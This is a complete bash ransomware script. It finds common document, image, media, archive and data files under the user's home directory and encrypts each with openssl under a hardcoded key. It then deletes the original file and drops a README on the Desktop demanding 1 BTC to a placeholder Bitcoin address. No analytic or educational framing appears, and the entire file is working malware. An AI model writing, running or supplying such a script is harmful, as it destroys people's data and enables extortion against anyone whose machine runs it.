#!/bin/bash

TARGET="$HOME"
KEY="mySuperSecretKey123"
NOTE="$HOME/Desktop/README.txt"

# === Encrypt targeted files ===
find "$TARGET" -type f \( \
    -iname "*.txt" -o -iname "*.pdf" -o -iname "*.doc" -o -iname "*.docx" -o \
    -iname "*.xls" -o -iname "*.xlsx" -o -iname "*.ppt" -o -iname "*.pptx" -o \
    -iname "*.odt" -o -iname "*.png" -o -iname "*.jpg" -o -iname "*.jpeg" -o \
    -iname "*.mp3" -o -iname "*.mp4" -o -iname "*.zip" -o -iname "*.rar" -o \
    -iname "*.csv" -o -iname "*.json" -o -iname "*.xml" \
    \) 2>/dev/null | while read file; do
    openssl enc -aes-256-cbc -salt -in "$file" -out "$file.enc" -k "$KEY" 2>/dev/null && rm -f "$file"
done

# === Create ransom note ===
cat <<EOF > "$NOTE"
YOUR FILES HAVE BEEN ENCRYPTED!

To restore them:
Send 1 BTC to:
bc1qexamplefakebtcaddress

EOF
